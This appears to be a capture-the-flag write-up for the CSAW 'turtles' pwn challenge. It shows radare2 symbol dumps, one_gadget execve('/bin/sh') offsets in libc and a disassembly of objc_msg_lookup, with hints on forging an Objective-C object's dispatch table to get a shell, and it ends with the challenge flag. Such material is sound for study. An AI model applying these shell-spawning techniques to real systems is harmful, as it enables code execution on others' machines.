# turtles

Looks like you found a bunch of turtles but their shells are nowhere to
be seen! Think you can make a shell for them?

    nc pwn.chal.csaw.io 9003

Update (09/14 6:25 PM) - Added libs.zip with the libraries for the
challenge

[turtles](https://ctf.csaw.io/files/b3adfcc8a5cd4a1bf9a413c6f46fb212/turtles)
[libs.zip](https://ctf.csaw.io/files/f8d7ea4fde01101de29de49d91434a5a/libs.zip)

---

```sh
% r2 ./turtles
> is~Turtle
064 0x00000b56 0x00400b56  LOCAL   FUNC   46 _i_Turtle__say_
070 0x00001400 0x00601400  LOCAL    OBJ  104 _OBJC_MetaClass_Turtle
072 0x00001321 0x00601321  LOCAL    OBJ    7 _OBJC_ClassName_Turtle
073 0x00001480 0x00601480  LOCAL    OBJ   40 _OBJC_InstanceMethods_Turtle
076 0x000014c0 0x006014c0  LOCAL    OBJ  104 _OBJC_Class_Turtle
087 0x00001608 0x00601608  LOCAL    OBJ    8 __objc_class_ref_Turtle
121 0x00000e90 0x00400e90 GLOBAL    OBJ    4 __objc_class_name_Turtle
```

```sh
% one_gadget libs/libc.so.6
0x41320 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x41374 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6e77 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Take at look at its [source code][objc_msg_lookup] and disassembly

[objc_msg_lookup]: https://github.com/gcc-mirror/gcc/blob/cf82a597b0d189857acb34a08725762c4f5afb50/libobjc/sendmsg.c#L442

```sh
% r2 ./libs/libgnustep-base.so.1.25
[0x00005af0]> s sym.objc_msg_lookup
[0x0000fbe0]> af
[0x0000fbe0]> pdf
        ╎   ;-- rip:
┌ (fcn) sym.objc_msg_lookup 934
│   sym.objc_msg_lookup ();
│       ╎   0x0000fbe0      test rdi, rdi
│      ┌──< 0x0000fbe3      je 0xfc40
│      │╎   0x0000fbe5      push r15
│      │╎   0x0000fbe7      push r14
│      │╎   0x0000fbe9      push r13
│      │╎   0x0000fbeb      push r12
│      │╎   0x0000fbed      push rbp
│      │╎   0x0000fbee      push rbx
│      │╎   0x0000fbef      sub rsp, 8
│      │╎   0x0000fbf3      mov rbp, qword [rdi]
│      │╎   0x0000fbf6      mov rax, qword [rsi]                       ; arg2
│      │╎   0x0000fbf9      mov rdx, qword [rbp + 0x40]                ; [0x40:8]=0x500000001 ; '@'
│      │╎   0x0000fbfd      mov ecx, eax
│      │╎   0x0000fbff      mov r8, rax
│      │╎   0x0000fc02      shl ecx, 5
│      │╎   0x0000fc05      shr r8, 0x20
│      │╎   0x0000fc09      add ecx, r8d
│      │╎   0x0000fc0c      cmp rcx, qword [rdx + 0x28]                ; [0x28:8]=0x1a6f8 ; '('
│     ┌───< 0x0000fc10      jb 0xfc30
│     ││╎   0x0000fc12      mov rax, qword [rdx + 8]                   ; [0x8:8]=0
│     ││╎   0x0000fc16      mov rax, qword [rax]
│     ││╎   ; CODE XREF from sym.objc_msg_lookup (0xfc3d)
│    ┌────> 0x0000fc19      test rax, rax
│   ┌─────< 0x0000fc1c      je 0xfc50
│   │╎││╎   ; CODE XREF from sym.objc_msg_lookup (0xfd0c)
│ ┌┌──────> 0x0000fc1e      add rsp, 8
│ ╎╎│╎││╎   0x0000fc22      pop rbx
│ ╎╎│╎││╎   0x0000fc23      pop rbp
│ ╎╎│╎││╎   0x0000fc24      pop r12
│ ╎╎│╎││╎   0x0000fc26      pop r13
│ ╎╎│╎││╎   0x0000fc28      pop r14
│ ╎╎│╎││╎   0x0000fc2a      pop r15
│ ╎╎│╎││╎   0x0000fc2c      ret
..
│ ╎╎│╎└───> 0x0000fc30      mov rcx, qword [rdx]
│ ╎╎│╎ │╎   0x0000fc33      mov eax, eax
│ ╎╎│╎ │╎   0x0000fc35      mov rax, qword [rcx + rax*8]
│ ╎╎│╎ │╎   0x0000fc39      mov rax, qword [rax + r8*8]
│ ╎╎│└────< 0x0000fc3d      jmp 0xfc19
..
│ ╎╎│  └──> 0x0000fc40      mov rax, qword [reloc.nil_method_160]      ; [0x2194a0:8]=0
│ ╎╎│   ╎   0x0000fc47      ret
```

OFFSET `rbp + 0x40` is

```
/**
   * The dispatch table for this class.  Intialized and maintained by the
   * runtime.
   */
void *dtable;
```

Remember that turtle's type is "id"

```c
typedef struct objc_object
{
  struct objc_class *class_pointer;
} *id;
```

FLAG:

    flag{i_like_turtl3$_do_u?}
